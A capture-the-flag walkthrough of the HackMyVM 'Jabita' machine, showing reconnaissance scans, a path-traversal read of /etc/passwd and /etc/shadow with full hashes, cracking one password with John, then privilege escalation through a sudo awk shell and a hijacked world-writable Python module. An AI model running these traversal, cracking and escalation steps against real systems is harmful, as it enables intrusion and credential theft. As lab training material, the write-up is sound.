<h1 align="center"> Jabita-HMV: <a href="https://hackmyvm.eu/machines/machine.php?vm=Jabita">Jabita</a></h1/>


## Net Discover & NMAP
 ```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/Jabita]
└─$ sudo netdiscover -r 10.1.1.1/24 -i eth0 

 Currently scanning: 10.1.1.0/24   |   Screen View: Unique Hosts                                                                                                                                                                            
                                                                                                                                                                                                                                            
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.1.1.1        08:00:27:12:9a:21      1      60  PCS Systemtechnik GmbH                                                                                                                                                                   
 10.1.1.49       08:00:27:cf:c4:ea      1      60  PCS Systemtechnik GmbH 
 ```
 ```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/Jabita]
└─$ ip=10.1.1.49 && url=http://$ip                                                                                                                         
                                                                                  
┌──(coolatos㉿CooLaToS)-[~/HMV/Jabita]
└─$ nmap -v -T5 -p- -sC -sV -oN nmap-$ip.log $ip; clear; cat nmap-$ip.log
# Nmap 7.92 scan initiated Thu Sep 22 11:55:08 2022 as: nmap -v -T4 -p- -sC -sV -oN nmap/nmap-10.1.1.49.log 10.1.1.49
Nmap scan report for 10.1.1.49
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 00:b0:03:d3:92:f8:a0:f9:5a:93:20:7b:f8:0a:aa:da (ECDSA)
|_  256 dd:b4:26:1d:0c:e7:38:c3:7a:2f:07:be:f8:74:3e:bc (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 22 11:55:17 2022 -- 1 IP address (1 host up) scanned in 8.33 seconds
 ```
```
┌──(coolatos㉿CooLaToS)-[~/HMV/jabita]
└─$ curl $url
<h1 style="text-align:center">We're building our future.</h1>
```
## FerroxBuster 
```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/jabita/ferox]
└─$ feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $url -t 500 -o ferox-$ip.log

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.1.1.49
 🚀  Threads               │ 500
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox-10.1.1.49.log
 💲  Extensions            │ [txt, php, html, zip, htm, bak, pem]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        5w       62c http://10.1.1.49/
403      GET        9l       28w      274c http://10.1.1.49/.php
403      GET        9l       28w      274c http://10.1.1.49/.html
403      GET        9l       28w      274c http://10.1.1.49/.htm
301      GET        9l       28w      309c http://10.1.1.49/building => http://10.1.1.49/building/
200      GET       10l      202w     1406c http://10.1.1.49/building/contact.php
200      GET        4l       30w      219c http://10.1.1.49/building/gallery.php

```
```html
┌──(coolatos㉿CooLaToS)-[~/HMV/jabita/ferox]
└─$ curl http://10.1.1.49/building/                                                                                                                                                                                                      1 ⨯
<!DOCTYPE html>
<html>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
        <body>
                 <div class="w3-bar w3-black">
                  <a href="/building/index.php?page=home.php" class="w3-bar-item w3-button">Home</a>
                  <a href="/building/index.php?page=gallery.php" class="w3-bar-item w3-button">Gallery</a>
                  <a href="/building/index.php?page=contact.php" class="w3-bar-item w3-button">Contact</a>
                </div> 
        </body>
</html>
```
## Nikto
```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/jabita]
└─$ nikto -h $url/building -C all -output nikto-$ip.html -Format HTML          
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.1.1.49
+ Target Hostname:    10.1.1.49
+ Target Port:        80
+ Start Time:         2022-09-22 12:56:47 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ /building/index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
```
```html
┌──(coolatos㉿CooLaToS)-[~/HMV/jabita]
└─$ curl  $url/building/index.php?page=../../../../../../../../../../etc/passwd
<!DOCTYPE html>
<html>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
        <body>
                 <div class="w3-bar w3-black">
                  <a href="/building/index.php?page=home.php" class="w3-bar-item w3-button">Home</a>
                  <a href="/building/index.php?page=gallery.php" class="w3-bar-item w3-button">Gallery</a>
                  <a href="/building/index.php?page=contact.php" class="w3-bar-item w3-button">Contact</a>
                </div> 
        </body>
</html>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
jack:x:1001:1001::/home/jack:/bin/bash
jaba:x:1002:1002::/home/jaba:/bin/bash
```
```html
┌──(coolatos㉿CooLaToS)-[~/HMV/jabita]
└─$ curl  $url/building/index.php?page=/home/jaba/.ssh/id_rsa                  
<!DOCTYPE html>
<html>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
        <body>
                 <div class="w3-bar w3-black">
                  <a href="/building/index.php?page=home.php" class="w3-bar-item w3-button">Home</a>
                  <a href="/building/index.php?page=gallery.php" class="w3-bar-item w3-button">Gallery</a>
                  <a href="/building/index.php?page=contact.php" class="w3-bar-item w3-button">Contact</a>
                </div> 
        </body>
</html>

                                                                                                                                                                                                                                             
┌──(coolatos㉿CooLaToS)-[~/HMV/jabita]
└─$ curl  $url/building/index.php?page=/home/jack/.ssh/id_rsa
<!DOCTYPE html>
<html>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
        <body>
                 <div class="w3-bar w3-black">
                  <a href="/building/index.php?page=home.php" class="w3-bar-item w3-button">Home</a>
                  <a href="/building/index.php?page=gallery.php" class="w3-bar-item w3-button">Gallery</a>
                  <a href="/building/index.php?page=contact.php" class="w3-bar-item w3-button">Contact</a>
                </div> 
        </body>
</html>
```
```html
┌──(coolatos㉿CooLaToS)-[~/HMV/jabita]
└─$ curl  $url/building/index.php\?page=/etc/shadow
<!DOCTYPE html>
<html>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
        <body>
                 <div class="w3-bar w3-black">
                  <a href="/building/index.php?page=home.php" class="w3-bar-item w3-button">Home</a>
                  <a href="/building/index.php?page=gallery.php" class="w3-bar-item w3-button">Gallery</a>
                  <a href="/building/index.php?page=contact.php" class="w3-bar-item w3-button">Contact</a>
                </div> 
        </body>
</html>

root:$y$j9T$avXO7BCR5/iCNmeaGmMSZ0$gD9m7w9/zzi1iC9XoaomnTHTp0vde7smQL1eYJ1V3u1:19240:0:99999:7:::
daemon:*:19213:0:99999:7:::
bin:*:19213:0:99999:7:::
sys:*:19213:0:99999:7:::
sync:*:19213:0:99999:7:::
games:*:19213:0:99999:7:::
man:*:19213:0:99999:7:::
lp:*:19213:0:99999:7:::
mail:*:19213:0:99999:7:::
news:*:19213:0:99999:7:::
uucp:*:19213:0:99999:7:::
proxy:*:19213:0:99999:7:::
www-data:*:19213:0:99999:7:::
backup:*:19213:0:99999:7:::
list:*:19213:0:99999:7:::
irc:*:19213:0:99999:7:::
gnats:*:19213:0:99999:7:::
nobody:*:19213:0:99999:7:::
_apt:*:19213:0:99999:7:::
systemd-network:*:19213:0:99999:7:::
systemd-resolve:*:19213:0:99999:7:::
messagebus:*:19213:0:99999:7:::
systemd-timesync:*:19213:0:99999:7:::
pollinate:*:19213:0:99999:7:::
sshd:*:19213:0:99999:7:::
syslog:*:19213:0:99999:7:::
uuidd:*:19213:0:99999:7:::
tcpdump:*:19213:0:99999:7:::
tss:*:19213:0:99999:7:::
landscape:*:19213:0:99999:7:::
usbmux:*:19236:0:99999:7:::
lxd:!:19236::::::
jack:$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0:19236:0:99999:7:::
jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7:::
```
```
┌──(coolatos㉿CooLaToS)-[~/HMV/jabita]
└─$ cat hash.txt                                   
jack:$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0:19236:0:99999:7:::
jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7:::
root:$y$j9T$avXO7BCR5/iCNmeaGmMSZ0$gD9m7w9/zzi1iC9XoaomnTHTp0vde7smQL1eYJ1V3u1:19240:0:99999:7:::
```
## John
```bash

┌──(coolatos㉿CooLaToS)-[~/HMV/jabita]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
joaninha         (jack)     
1g 0:00:00:00 DONE (2022-09-22 12:24) 2.127g/s 8170p/s 8170c/s 8170C/s yazmin..dodgers
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
## SSH User
```
┌──(coolatos㉿CooLaToS)-[~/HMV/jabita]
└─$ ssh jack@$ip                                                                                                                                                                                                                       130 ⨯
jack@10.1.1.49's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-47-generic x86_64)]

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Sep 22 10:06:36 AM UTC 2022

  System load:  0.080078125       Processes:               122
  Usage of /:   52.3% of 9.75GB   Users logged in:         1
  Memory usage: 31%               IPv4 address for enp0s3: 10.1.1.49
  Swap usage:   0%


3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Sep 22 09:43:27 2022 from 10.1.1.2
jack@jabita:~$ id
uid=1001(jack) gid=1001(jack) groups=1001(jack)
```
```bash
jack@jabita:~$ sudo -l
Matching Defaults entries for jack on jabita:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, listpw=never

User jack may run the following commands on jabita:
    (jaba : jaba) NOPASSWD: /usr/bin/awk
```
<h1 align="center"> awk: <a href="https://gtfobins.github.io/gtfobins/awk/">https://gtfobins.github.io/gtfobins/awk/</a></h1/>

## User jaba

```bash
jack@jabita:~$ sudo -u jaba /usr/bin/awk 'BEGIN {system("/bin/bash")}'
jaba@jabita:/home/jack$ id
uid=1002(jaba) gid=1002(jaba) groups=1002(jaba)
```
## User Flag
```bash
jaba@jabita:~$ ls
user.txt
```
## Get Root
```bash
 jaba@jabita:~$ sudo -l
Matching Defaults entries for jaba on jabita:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, listpw=never

User jaba may run the following commands on jabita:
    (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py
```
```bash
jaba@jabita:~$ cat /usr/bin/clean.py
import wild

wild.first()
```
```bash
jaba@jabita:~$ find / -iname wild 2>/dev/null
jaba@jabita:~$ find / -iname wild.py 2>/dev/null
/usr/lib/python3.10/wild.py
```
```bash
jaba@jabita:~$ ls -alh /usr/lib/python3.10/wild.py
-rw-r--rw- 1 root root 63 Sep 22 09:39 /usr/lib/python3.10/wild.py
```
```bash
jaba@jabita:~$ cat /usr/lib/python3.10/wild.py
def first():
        print("Hello")
```
Since we have write access we can add our code
```bash
jaba@jabita:~$ echo import 'os; os.system("/bin/bash")' >> /usr/lib/python3.10/wild.py
jaba@jabita:~$ cat /usr/lib/python3.10/wild.py
def first():
        print("Hello")
import os; os.system("/bin/bash")
```
```bash
jaba@jabita:~$ sudo /usr/bin/python3 /usr/bin/clean.py
root@jabita:/home/jaba# 
```
## Root Flag
```bash
root@jabita:/home/jaba# cd
root@jabita:~# ls
root.txt  snap
```
